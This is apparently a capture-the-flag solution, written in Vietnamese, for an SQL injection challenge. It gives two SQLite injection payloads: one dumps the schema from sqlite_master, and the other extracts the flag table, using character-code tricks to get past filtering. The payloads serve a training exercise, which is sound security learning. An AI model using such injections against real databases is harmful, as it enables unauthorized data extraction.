# Solution

Payload để dump các statement:

`(select char(0x4d,0x53,0x47,0x2d) || sql as msg from sqlite_master)`

![dump_statement](https://user-images.githubusercontent.com/77546253/174476235-25fd8104-cec6-4a4e-9d6a-8931e74d4f0a.png)


Payload để dump flag:

`(select REPLACE(char(0x4d,0x53,0x47,0x2d)||flag,char(0x4b),char(0x76)) msg from flag)`

![flag](https://user-images.githubusercontent.com/77546253/174476241-4840434d-8e6a-493f-b354-ac6bdd43af01.png)
